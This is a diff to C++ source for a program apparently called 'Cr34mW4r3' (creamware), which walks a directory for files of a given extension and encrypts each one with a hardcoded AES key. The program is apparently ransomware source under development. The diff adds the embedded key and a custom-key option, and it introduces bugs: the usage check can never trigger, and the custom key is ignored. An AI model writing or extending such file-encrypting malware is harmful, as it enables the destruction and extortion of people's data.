@@ -43,16 +43,29 @@ void FindFile(const std::wstring& directory, wstring ext, queue<wstring>& result
     }
 }
 
+
+
 int wmain(int argc, wchar_t* argv[])
 {
+    auto printNice = [](const wchar_t* s) {
+        wcout << "[*] " << s << endl;
+    };
 
     const wchar_t* help =
-        L"[*] This is  manpage\n"
-        L"[+] usage: creamware <dirpath>";
+        L"[*] This is  the Cr34mW4r3 manpage\n"
+        L"[+] usage: creamware <dirpath> <aeskey-16>";
 
-    if (argc <= 1) {
+
+    if (argc < 1) {
         wcout << help;
         return 0;
+    }
+
+    cout << argc << endl; 
+    auto aeskey = L"3igcZhRdWq96m3GUmTAiv9";
+    if (argc == 3) {
+        printNice(L"using custom key ...");
+        aeskey = argv[2];
     }
 
     const wchar_t* directoryPath = argv[1];
@@ -68,10 +81,13 @@ int wmain(int argc, wchar_t* argv[])
 
         wcout << "[*] Encrypting " << fileName;
         wcout << "to " << newFileName << endl;
-        encryptFile(fileName.c_str(), newFileName.c_str(), false);
+        encryptFile(
+            fileName.c_str(), newFileName.c_str(),
+            L"3igcZhRdWq96m3GUmTAiv9", false
+        );
 
-        results.pop();
         wcout << fileName << endl;
+        results.pop();
     }
     return 0;
 }
